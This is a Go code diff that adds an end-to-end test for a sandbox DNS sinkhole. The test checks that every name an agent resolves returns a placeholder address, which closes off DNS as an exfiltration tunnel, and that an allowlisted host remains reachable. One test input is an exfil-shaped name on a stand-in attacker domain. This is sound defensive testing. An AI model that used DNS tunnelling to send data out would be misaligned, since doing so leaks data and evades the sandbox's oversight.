@@ -158,6 +158,87 @@ func TestEgressACLE2E(t *testing.T) {
 	}
 }
 
+// TestEgressDNSSinkholeE2E verifies that DNS is sinkholed: every name the agent
+// resolves — allowlisted or not — comes back as the constant placeholder, so a
+// resolution carries no data off-box and DNS can't be an exfil tunnel. An
+// allowlisted host is still reachable because the proxy re-resolves the real
+// name itself after the agent connects to the placeholder.
+func TestEgressDNSSinkholeE2E(t *testing.T) {
+	setup.RequireStack(t)
+	setup.RequireHiverCLI(t)
+
+	bundleImage := setup.BuildTSMCPServerBundle(t)
+	key := fmt.Sprintf("e2e-dns-%d", time.Now().UnixNano())
+
+	config := hiverclient.SandboxConfig{
+		Image: bundleImage,
+		FS: []hiverclient.FileSystem{
+			{Mount: "/workspace", Backend: "local", ACLs: []hiverclient.ACLRule{{Path: "/**", Access: "rw"}}},
+		},
+		Egress: []hiverclient.EgressRule{
+			{Access: "allow", Host: "go.dev"},
+		},
+	}
+
+	c := hiverclient.NewClient(setup.GatewayURL, hiverclient.WithTimeout(2*time.Minute))
+	t.Cleanup(func() { _ = c.Shutdown(context.Background(), key) })
+
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
+	defer cancel()
+
+	sbx, err := c.GetOrCreateSandbox(ctx, key, config)
+	if err != nil {
+		t.Fatalf("GetOrCreateSandbox: %v", err)
+	}
+
+	session := setup.ConnectMCP(t, ctx, sbx.ProxyURL(3000)+"/mcp", &bytes.Buffer{})
+	defer session.Close()
+
+	const sinkIP = "192.0.2.1"
+
+	// Every name resolves to the constant placeholder, regardless of whether it
+	// is on the allowlist: an allowlisted host (go.dev), an unlisted host, and
+	// an exfil-shaped name all return the sink, so the agent's resolver never
+	// reaches a real authoritative server with attacker-chosen labels.
+	for _, name := range []string{
+		"go.dev",
+		"unlisted-host.example.com",
+		"secret-data-exfil.attacker.example",
+	} {
+		if got := agentResolve(t, ctx, session, name); got != sinkIP {
+			t.Errorf("DNS for %q = %q, want sink %q", name, got, sinkIP)
+		}
+	}
+
+	// Despite resolving to the placeholder, an allowlisted host is still
+	// reachable: the agent connects to the placeholder, the proxy reads the SNI
+	// and re-resolves go.dev on its own resolver to make the real connection.
+	if exit := agentBashExit(t, ctx, session, "curl -s -o /dev/null --max-time 10 https://go.dev"); exit != 0 {
+		t.Fatalf("HTTPS to allowed go.dev should succeed despite sinkholed DNS (exit=%d)", exit)
+	}
+}
+
+// agentResolve resolves name from inside the sandbox via Node's getaddrinfo
+// (dns.lookup), returning the IPv4 address the agent's resolver hands back. Node
+// is used because the alpine agent image ships no getent/dig but always has a
+// Node runtime. With `node -e <script> <name>`, name lands in process.argv[1].
+func agentResolve(t *testing.T, ctx context.Context, session *mcp.ClientSession, name string) string {
+	t.Helper()
+	// Single-quote-free so the whole script can be single-quoted for the shell.
+	const script = `require("dns").lookup(process.argv[1], {family: 4}, (e, a) => { if (e) { console.error(e.message); process.exit(1); } process.stdout.write(a); });`
+	var out struct {
+		Stdout, Stderr string
+		ExitCode       int
+	}
+	setup.CallMCP(t, ctx, session, "bash", map[string]any{
+		"cmd": fmt.Sprintf(`node -e '%s' '%s'`, script, name),
+	}, &out)
+	if out.ExitCode != 0 {
+		t.Fatalf("agent resolve %q: exit=%d stderr=%q", name, out.ExitCode, out.Stderr)
+	}
+	return strings.TrimSpace(out.Stdout)
+}
+
 func agentCurlStatus(t *testing.T, ctx context.Context, session *mcp.ClientSession) string {
 	t.Helper()
 	var out struct {
